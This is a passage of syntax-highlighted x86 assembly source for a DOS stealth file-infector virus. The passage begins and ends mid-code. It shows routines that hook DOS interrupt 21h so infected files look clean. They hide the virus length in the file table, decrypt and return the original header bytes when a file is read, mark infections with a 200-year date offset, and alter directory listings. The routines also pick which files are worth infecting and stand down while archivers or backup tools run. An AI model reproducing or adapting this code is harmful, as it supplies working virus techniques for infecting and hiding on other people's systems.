                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">                 </span><span class="sc1">; get file sft</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; mark in SFT that size has</span><span class="sc0">
                                                </span><span class="sc1">; already been stealthed using</span><span class="sc0">
                                                </span><span class="sc1">; unused bit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stlth_fsize_sft</span><span class="sc0">         </span><span class="sc1">; stealth file size in sft</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">no_stealth_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">error_21hl</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">change_24h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">return_from_int</span><span class="sc0">
</span><span class="sc5">exit_r_stealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">                     </span><span class="sc1">; execute the original int 21h</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">exit_read_stealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">return_from_int</span><span class="sc0">

</span><span class="sc5">read_from_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">chk_extsuch</span><span class="sc0">             </span><span class="sc1">; check if seems a file good to</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_r_stealth</span><span class="sc0">          </span><span class="sc1">; infect by extension and such</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_r_stealth</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_nostealth</span><span class="sc0">         </span><span class="sc1">; check if zip or backup running</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_r_stealth</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; has been size already stlthed</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">already_sft</span><span class="sc0">             </span><span class="sc1">; before?</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stlth_fsize_sft</span><span class="sc0">         </span><span class="sc1">; if not stealth it</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; and sign as stlthed in sft</span><span class="sc0">
</span><span class="sc5">already_sft</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; current offset in file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ax_setvalue</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">                     </span><span class="sc1">; execute the read</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_read_stealth</span><span class="sc0">       </span><span class="sc1">; exit if read unsucesfull</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                  </span><span class="sc1">; if not reading the header then</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">exit_read_stealth</span><span class="sc0">       </span><span class="sc1">; np and we can exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">; ES is high word of offset in</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; file. if &lt;&gt; 0 then it isn't</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exit_read_stealth</span><span class="sc0">       </span><span class="sc1">; on header for sure</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">exit_read_stealth</span><span class="sc0">       </span><span class="sc1">; if 0 bytes readed then exit</span><span class="sc0">
                                                </span><span class="sc1">; as well</span><span class="sc0">

</span><span class="sc1">; if we are here then the header of an infected file is going to be readed, so</span><span class="sc0">
</span><span class="sc1">; we must restore the original bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">                  </span><span class="sc1">; disk reset</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; current off in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; save current offset on stack</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; file size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                           </span><span class="sc1">; SI:AX has filesize</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                  </span><span class="sc1">; calculate bytes been added</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">; to make (lenght MOD 10h = 0)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">n_adjust_lng</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; if &lt; then obviously it was a</span><span class="sc0">
                                                </span><span class="sc1">; wrap around, so inc the higher</span><span class="sc0">
                                                </span><span class="sc1">; word</span><span class="sc0">
</span><span class="sc5">n_adjust_lng</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc5">virus_lenght</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; add to stealthed size so</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; we can actually read the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; move to virus start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; read first 72h bytes of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc0">                  </span><span class="sc1">; virus, this is the decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; decryption instruction is</span><span class="sc0">
                                                </span><span class="sc1">; the fifth block in the</span><span class="sc0">
                                                </span><span class="sc1">; decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc0">

</span><span class="sc5">find_5_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)]</span><span class="sc0">      </span><span class="sc1">; jump through</span><span class="sc0">
                                                                </span><span class="sc1">; block jumps</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">find_5_block</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                           </span><span class="sc1">; add base</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; method is not-ted</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_ins_b</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; decryption method</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_val_b</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; decryption value</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">preffo</span><span class="sc0">
</span><span class="sc5">preffo</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">original_file</span><span class="sc0">         </span><span class="sc1">; file pointer to</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; stored file bytes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">                </span><span class="sc1">; move there</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; read saved bytes from file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                  </span><span class="sc1">; 1ah bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">original_file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">

</span><span class="sc5">decrypt_original</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">enc_ins_b</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">                 </span><span class="sc1">; decrypt original bytes of</span><span class="sc0">
</span><span class="sc5">enc_val_b</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc0">                    </span><span class="sc1">; file</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_original</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stlth_fsize_sft</span><span class="sc0">         </span><span class="sc1">; stealth virus size in SFT</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; restore current</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; offset in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">ax_setvalue</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1400h</span><span class="sc0">                   </span><span class="sc1">; saved offset in file user</span><span class="sc0">
                                                </span><span class="sc1">; wanted to read from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">original_file</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                  </span><span class="sc1">; how many bytes virus changed</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ax_setvalue</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; calculate how many</span><span class="sc0">
                                                        </span><span class="sc1">; we must stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; cx has number of bytes readed</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_more_tr</span><span class="sc0">              </span><span class="sc1">; if readed &lt; how many to stlth</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; then proceed, else stealth all</span><span class="sc0">
</span><span class="sc5">no_more_tr</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; of them</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy needed amount of original</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; bytes there</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_read_stealth</span><span class="sc0">
</span><span class="sc5">back_j_old21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chain_old21h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">return_from_int</span><span class="sc0">

</span><span class="sc5">get_set_date</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">chk_extsuch</span><span class="sc0">             </span><span class="sc1">; see if seems infectable</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">back_j_old21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; just get/set file date func</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">back_j_old21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">isa_getdate</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">200d</span><span class="sc0">                 </span><span class="sc1">; add the virus 200 years when</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">                     </span><span class="sc1">; setting date</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">return_from_int</span><span class="sc0">
</span><span class="sc5">isa_getdate</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">                     </span><span class="sc1">; get date</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">200d</span><span class="sc0">                 </span><span class="sc1">; and sub the 200 years</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">return_from_int</span><span class="sc0">

</span><span class="sc5">ff_fn_stealth</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; this is called at 11h/12h and 4eh/4fh functions of int21h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_nostealth</span><span class="sc0">         </span><span class="sc1">; if zip or backup running</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">back_j_old21h</span><span class="sc0">           </span><span class="sc1">; then don't stealth</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">                             </span><span class="sc1">; execute the call</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_err_ff</span><span class="sc0">                     </span><span class="sc1">; C if error (for 4e/4f)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; AL &lt;&gt; 0 if error</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exit_err_ff</span><span class="sc0">                     </span><span class="sc1">; (for 11h/12h)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                          </span><span class="sc1">; get dta</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">func_21h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">12h</span><span class="sc0">  </span><span class="sc1">; 21h fnct. 11h/12h?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">corr_off1112</span><span class="sc0">                    </span><span class="sc1">; correct the offsets</span><span class="sc0">
